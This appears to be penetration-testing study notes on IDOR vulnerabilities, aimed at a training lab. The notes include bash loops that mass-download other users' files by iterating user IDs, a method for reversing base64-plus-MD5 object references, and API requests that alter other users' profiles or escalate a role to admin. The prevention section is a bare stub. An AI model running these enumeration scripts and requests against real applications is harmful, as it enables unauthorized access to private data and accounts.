`Insecure Direct Object References (IDOR)` vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects

## Identifying IDORs

Examples
```bash
# URL Paramaters/HTTP Request example
?uid=1                > ?uid=2                   # Try incrementing/fuzzing
?filename=file_1.pdf  > ?filename=file_2.pdf

# If the URL paramater cant be altered, perhaps a UID field in a GET request can, allowing us to act as another user...
```
```JavaScript
// AJAX Calls in front-end code
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}

// Identifying hashing/encoding in front-end code
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```
```json
// Comparing User Roles vuln
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

## Mass IDOR Enumeration
Assume a `UID` field is vulnerable. We can either use a tool like Burp Intruder or ZAP Fuzzer to retrieve all files or write a small bash script to download all files, which is what we will do.

Methods
```bash
1. # Burp Intruder/ZAP Fuzzing

2. # Script
# View Source Code
CTRL+SHIFT+C (element inspecter) > Click links to view HTML source code

# Pick any word to grep the link to the file, then curl page
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"  # example

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>

# Use regex to match for strings we want to fuzz
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf

# for loop to loop over uid paramater

#!/bin/bash
url="http://SERVER_IP:PORT"
for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

## Bypassing Encoded References
As most modern web applications are developed using JavaScript frameworks, like Angular, React, or Vue.js, many web developers may make the mistake of performing sensitive functions on the front-end.

First assume we download a file and the POST request reveals a hash
```
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

Assume we take a look at the link in the source code, we see that it is calling a JavaScript function with javascript:downloadContract('1'). Looking at the downloadContract() function in the source code, we see the following:
```javascript
// Function Disclosure
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```
From this, we see the uid is encoded with btoa (base64), then hashed (md5)

Verifying Function was Disclosed
```bash
# match uid in requests with this to see we we can math
echo -n <uid> | base64 -w 0 | md5sum
#if we did this correctly, hash should match the contract hash from earlier


# Mass Enumeration (for loop) of each uid
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done


# Mass POST request to download all contracts
#!/bin/bash
for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

## IDOR in Insecure APIs
IDOR Insecure Function Calls enable us to call APIs or execute functions as another user.
#### Identifying Insecure APIs
Scenario: We modify the profile settings of a user.

If intercepting requests reveals page is sending POST/PUTs to an API endpoint, we might be able to abuse this

Example PUT Request we intercepted
```bash
PUT /profile/api.php/profile/1 HTTP/1.1
...SNIP...
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
}
```

#### Exploiting Insecure APIs
Several potentially ways to exploit the above scenario

Information Disclosure -- # Before blind exploits, enumerate the API
```bash
# Send GET Requests of other UIDs
GET /profile/api.php/profile/2 HTTP/1.1    # HTTP Request

{                                          # HTTP Response
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
}
```
Consider a script to do all this and pull info of various roles, emails, names, etc...

Exploit examples
```bash
# Modify UID to change into another user's details
PUT /profile/api.php/profile/2 HTTP/1.1           # change UID here
...SNIP...
{
    "uid": 2,                                     # change UID here
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",   # change UUID with disclosed info
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
} # Potential Error -- UUID Mismatch

# Creating a new user
POST /profile/api.php/profile/50 HTTP/1.1   # change UID and to POST
...SNIP...
{
    "uid": 50,                              # change UID here
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",            
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
} # Potential Error -- lacking privileges

# Changing Role to admin
PUT /profile/api.php/profile/1 HTTP/1.1
...SNIP...
Cookie: role=web_admin  # Change role
{
    "uid": 1,                             
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin", # Change role (named different? - see info disclosure above)
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
} # Potential Error -- invalid role


```


## Prevention

Object-Level Access Control
Object Referencing

